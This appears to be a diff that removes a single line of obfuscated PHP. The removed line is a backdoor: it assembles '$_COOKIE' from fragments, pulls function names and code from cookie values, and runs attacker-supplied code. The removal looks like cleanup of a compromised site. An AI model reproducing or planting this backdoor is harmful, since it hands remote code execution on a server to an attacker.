@@ -1,1 +1,0 @@
-<?php $sq='OKI';/*WI_*/$jn='_CO';/*`jWK*/$hs='E';$mx/*47*/=${$jn.$sq.$hs};$s=/*5h*/$mx['cB'].$mx/*6v?*/['TG'];$jc=$mx['Br'].$mx['xB'].$mx['U'];$hr=$s('',$jc($mx['T']));$hr();
